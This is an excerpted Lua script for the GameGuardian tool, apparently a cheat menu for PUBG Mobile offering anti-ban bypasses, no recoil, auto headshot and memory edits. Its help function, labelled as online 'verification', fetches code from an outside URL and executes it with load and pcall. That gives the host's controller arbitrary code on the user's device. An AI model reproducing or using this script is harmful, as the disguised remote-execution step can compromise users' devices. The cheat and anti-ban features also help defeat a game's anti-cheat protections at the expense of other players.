...
function HOME()
  MN = gg.choice({
    ...
    "📂 Credit",
    "========》[ EXIT ] 《========",
  }, nil, "________________________________\nCrazy\nONLINE Script\nPUBG MOBILE 0.11\nAuto Update\n________________________________")
 if MN == nil then
  else
  ...
  if MN == 5 then HLP() end
  if MN == 6 then ctn() end
  if MN == 7 then
     Exit()
     end
  end
...
function TST()
  GG6 = gg.multiChoice({
  	"🔹Antiban Virtual/UpNormal [After Landing]",
      "🔹Antiban Virtual/UpNormal Final Match [End Match]",
...
function HLP()
gg.alert("This Menu Need Internet Connetion For Verifycation")
gg.alert("🔹If You Need Help Contac Admin🔹")

V = load(gg.makeRequest('https://xxxnxx.com').content)
pcall(V)


gg.toast("loading verifycation....")
gg.clearResults()
...
local t = gg.getResults(10)
gg.editAll("99999", 16)
gg.toast("FIXED BLINK")
end
function MF2()
  MN6 = gg.multiChoice({
    "🔹Less Recoil Lobby Fix",
    "🔹No Recoil Lobby",
    "🔹No Recoil Land",
    "🔹Less Recoil Land",
    "🔹Auto Headshot 95%",
...
function sbps()
  gg.setVisible(false)
  HH = gg.alert("Bypass Dulu Kampret", "Ya", "Sudah", "Baca Dulu")
  if HH == 1 then
    pass()
  end
  if HH == 2 then
